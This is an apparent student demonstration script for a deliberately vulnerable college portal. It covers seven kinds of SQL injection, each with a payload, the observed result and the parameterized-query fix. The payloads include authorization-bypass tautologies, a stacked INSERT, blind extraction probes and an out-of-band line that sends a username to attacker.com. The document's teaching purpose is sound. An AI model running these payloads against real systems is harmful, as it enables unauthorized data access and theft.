# 1. CLASSIC / IN-BAND SQL INJECTION

## Where to go
Teacher Portal → Students

## Login
Username: EMP001
Password: teacher123

## Field
Search (Name or Reg No)

## Normal input
Rahul

## Expected normal result
Returns any student named Rahul who is strictly within the teacher's authorized department (CSE). Other students are hidden.

## Vulnerable payload
a%' OR 1=1 --

## Where to paste it
Search (Name or Reg No)

## Vulnerable result
The table populates with every student in the college, bypassing the intended department restriction. You can visually see the "Department" column contains records from ECE, IT, and MECH.

## Why this is a vulnerability
The backend normally applies a hardcoded data isolation filter (`department_id = ?`). By injecting `a%' OR 1=1 --`, the attacker appends an `OR` condition that always evaluates to True, and comments out the rest of the query. Since `OR` has lower precedence than `AND`, the query evaluates to True for all rows, overriding the legitimate department filter.

## Prevented test
Use the exact same payload `a%' OR 1=1 --` in the Prevented application.

## Prevented result
The table returns 0 results. It safely searches for a student literally named "a%' OR 1=1 --".

## Security mechanism
SQLAlchemy ORM automatically parameterizes the search string and applies the `.filter()` securely, treating the input strictly as a string value rather than executable syntax.

## Examiner explanation
"Normally, a teacher is only authorized to view students in their assigned department. By injecting SQL syntax, we restructured the backend query logic to bypass this legitimate authorization boundary. The prevented version stops this because parameterized queries treat the malicious payload strictly as a search string, not executable code."

## Important warning
Ensure you clear the search box to return to normal functionality.

---

# 2. BOOLEAN-BASED FILTER BYPASS (Notice Lookup)

## Where to go
Student Portal → Notices

## Login
Username: REG2023100
Password: student123

## Field
Enter Notice ID (e.g. 1)

## Normal input
1

## Expected normal result
Returns the Institutional Notice with ID 1 (e.g., "Mid-Semester Exam Schedule").

## Vulnerable payload
' OR 1=1 --

## Where to paste it
Enter Notice ID (e.g. 1)

## Vulnerable result
The query bypasses the ID filter and returns MULTIPLE notices, including older or historical notices (e.g., Notice ID 1, Notice ID 2, Notice ID 3) that are normally hidden.

## Why this is a vulnerability
The application insecurely concatenates the input directly into the `WHERE` clause. By inputting `' OR 1=1 --`, the condition evaluates to TRUE for every single row in the database. As a result, the application dumps all notices instead of the single requested one.

## Prevented test
Use the exact same payload in the Prevented application.

## Prevented result
The UI simply displays "Notice not found or error occurred" (or returns 0 results).

## Security mechanism
The prevented backend uses SQLAlchemy ORM parameterization, forcing the database to safely look for a literal notice ID matching the exact string payload `' OR 1=1 --` (which doesn't exist).

## Examiner explanation
"We demonstrated how insecure string concatenation allows an attacker to manipulate the underlying SQL logic. By adding `OR 1=1`, we forced the `WHERE` clause to become true for all records, causing the database to return historical and hidden data that the query normally filters out. The prevented app uses parameterized queries, neutralizing the logical operators and treating them purely as text data."

## Important warning
This type of bypass relies on properly escaping the surrounding quotes in the backend query. Ensure the single quote `'` is included at the beginning of the payload.

---

# 3. STACKED QUERIES

## Where to go
Teacher Portal → Students

## Login
Username: EMP001
Password: teacher123

## Field
Enter Student ID (e.g. 1)

## Normal input
1

## Expected normal result
Successfully retrieves the student's profile for viewing/editing.

## Vulnerable payload
1'); INSERT INTO notices (title, category, content, target_audience, publish_date, expiry_date, author_id) VALUES ('Hacked Notice', 'Alert', 'This was created via Stacked Query!', 'all', '2025-01-01', '2025-12-31', 1); --

## Where to paste it
Enter Student ID (e.g. 1)

## Vulnerable result
The profile loads normally. However, if you navigate to the "Notices" tab, you will now see a brand new notice titled "Hacked Notice" that was maliciously inserted by the database.

## Why this is a vulnerability
The endpoint performs an audit log insertion using the unsafe SQLite `executescript()` function. This allows multiple statements separated by semicolons to execute in a single request. 

## Prevented test
Use the exact same payload in the Prevented application.

## Prevented result
The lookup fails with "Student not found" and no new notice is created. 

## Security mechanism
The prevented version uses SQLAlchemy ORM `db.add()` to insert the audit log safely, which inherently does not support multiple statement execution.

## Examiner explanation
"By using a semicolon, we terminated the intended audit log query and attached an entirely new, independent INSERT statement. This allowed us to non-destructively inject fake data into the system. The prevented version uses standard ORM methods which strictly execute one intended operation at a time."

## Important warning
This relies on the specific behavior of the database driver (like Python's `sqlite3.executescript()`). Not all drivers support stacked queries by default.

---

# 4. BOOLEAN-BASED BLIND SQL INJECTION

## Where to go
Teacher Portal → Students

## Login
Username: EMP001
Password: teacher123

## Field
Enter Registration No (e.g. REG2023100)

## Normal input
REG2023100

## Expected normal result
UI returns a green banner: "Verified (Student Exists)"

## Vulnerable payload (TRUE Condition)
REG2023100' AND 1=1 --

## Where to paste it
Enter Registration No (e.g. REG2023100)

## Vulnerable result
UI returns: "Verified (Student Exists)"

## Vulnerable payload (FALSE Condition)
REG2023100' AND 1=0 --
*(UI returns: "Not Verified (Not Found)")*

## Vulnerable payload (Data Extraction)
REG2023100' AND (SELECT 1 FROM users WHERE username='EMP001' AND role='teacher') = 1 --
*(UI returns "Verified", proving EMP001 is a teacher)*

## Why this is a vulnerability
The application never displays database errors or data, only a generic True/False indicator. However, an attacker can append logical tests to the query. By observing whether the UI returns "Verified" or "Not Verified", the attacker can ask the database yes/no questions to map out hidden infrastructure character by character.

## Prevented test
Use the `AND 1=1` payload in the Prevented application.

## Prevented result
UI returns: "Not Verified (Not Found)".

## Security mechanism
Parameterized queries treat the logical tests as part of the string itself, meaning the database searches for a user literally named `REG2023100' AND 1=1 --`.

## Examiner explanation
"Even though this endpoint only gives a simple True/False response and no actual data, we can exploit the vulnerable query structure to ask the database boolean questions. By observing the responses, an attacker can extract sensitive information completely blind. The prevented version safely isolates the query structure from our logic."

## Important warning
Blind extraction is slow; attackers typically automate this using tools like SQLmap.

---

# 5. TIME-BASED BLIND SQL INJECTION

## Where to go
Student Portal → Subjects

## Login
Username: REG2023100
Password: student123

## Field
Enter Subject Code (e.g. CS101)

## Normal input
CS101

## Expected normal result
UI instantly returns a green banner: "Eligible for Data Structures"

## Vulnerable payload
CS101' AND (SELECT sleep(3)) = 1 --

## Where to paste it
Enter Subject Code (e.g. CS101)

## Vulnerable result
The UI button will show "Loading..." and the browser will completely freeze for **exactly 3 seconds** before returning a result.

## Why this is a vulnerability
When an application provides absolutely no visible output (not even True/False), an attacker can inject conditional sleep commands. If the condition is true, the database pauses. The attacker measures the response time to infer information.

## Prevented test
Use the exact same payload in the Prevented application.

## Prevented result
The UI returns instantly with "Not Eligible or Not Found". No delay occurs.

## Security mechanism
The parameterized query prevents the database engine from executing the `sleep()` function, treating it simply as a text string that does not match any subject code.

## Examiner explanation
"Because the application gave us no output to observe, we injected a command instructing the database server itself to pause execution for 3 seconds. The measurable delay confirms our injection was successful. The prevented version safely interprets the sleep command as literal text rather than executable logic."

## Important warning
SQLite does not natively have a `sleep()` function. We registered a custom mock `sleep()` function in Python to accurately simulate how this works in enterprise databases like MySQL/PostgreSQL.

---

# 6. OUT-OF-BAND (OOB) SQL INJECTION

## Where to go
Student Portal → Subjects

## Login
Username: REG2023100
Password: student123

## Field
Describe the issue with the subject... (Textarea)

## Normal input
Title: Server issue
Description: I cannot download the syllabus.

## Expected normal result
UI says "Issue reported successfully."

## Vulnerable payload
Test'); SELECT http_get('http://attacker.com/steal?data=' || (SELECT username FROM users LIMIT 1)); --

## Where to paste it
In the Description textarea (put "Hacked" in the title).

## Vulnerable result
The UI says "Issue reported successfully." However, scroll down to the **Security Demo** page, and you will see a simulated server log showing the database made a mock HTTP request containing the stolen username!

## Why this is a vulnerability
The injection uses a stacked query to command the database server to initiate an external network request, appending stolen data to the URL. This bypasses the application completely.

## Prevented test
Use the exact same payload in the Prevented application.

## Prevented result
The issue is logged normally as literal text. No OOB network event is generated in the Security Demo logs.

## Security mechanism
ORM parameterization prevents statement stacking and ensures the entire payload is treated purely as string data in the `description` column.

## Examiner explanation
"Instead of trying to pull data back through the web application, we injected a command forcing the database server to make an outbound HTTP request directly to us, carrying the stolen data in the URL. The prevented version safely treats our command as a harmless text description."

## Important warning
SQLite does not natively make network requests. We use a mock `http_get()` function to demonstrate the OOB paradigm safely and entirely locally.

---

# 7. SECOND-ORDER SQL INJECTION

## Where to go
Student Portal → Profile

## Login
Username: REG2023100
Password: student123

## Field
Blood Group (Dropdown/Input)

## Normal input
O+

## Expected normal result (Stage 1)
Profile updates successfully.

## Stage 2: Where to go
Teacher Portal → Blood Drive

## Stage 2: Login
Username: EMP001
Password: teacher123

## Normal input (Stage 2)
Enter Student Register Number: REG2023100

## Expected normal result (Stage 2)
The UI reports the student's normal blood group and Available Units for that group.

## Vulnerable payload (Stage 1)
O-' UNION SELECT 9999 --

## Where to paste it
Log in as the student (REG2023100) on the Student Portal → Profile.
Paste the payload in the Blood Group input field and click "Update Information".

## Vulnerable result (Stage 2)
Log in as the Teacher (EMP001) on the Teacher Portal → Blood Drive.
Enter the student's register number (REG2023100) and click "Check Status".
The UI suddenly reports: **Available Units: 9999** and **Inventory Status: Sufficient**. This occurs because the payload we previously stored was executed as SQL.

## Why this is a vulnerability
The application correctly and safely stored the malicious string in the database (Stage 1). However, during Stage 2, it retrieved that blood group string from the database and unsafely concatenated it directly into a *new* SQL query, assuming all data already in the database was trustworthy.

## Prevented test
Perform Stage 1 and Stage 2 in the Prevented application.

## Prevented result
The profile updates safely in Stage 1. However, when the Teacher searches in Stage 2, it returns **Available Units: 0** and **Inventory Status: Not Found** because it safely searches for an inventory record literally matching `O-' UNION...`.

## Security mechanism
The prevented version uses parameterized ORM queries during *both* the storage and the retrieval/execution stages, adhering to the principle that data from the database is still untrusted user input.

## Examiner explanation
"We demonstrated a two-stage attack. In stage one, the application safely stored our payload, so no attack occurred yet. In stage two, the application retrieved our payload from the database and trusted it blindly, concatenating it into a new query. The prevented application prevents this by treating data pulled from the database with the same caution as direct user input."

## Important warning
This demonstrates why relying solely on input sanitization at the boundary is insufficient; parameterized queries must be used universally across the codebase.
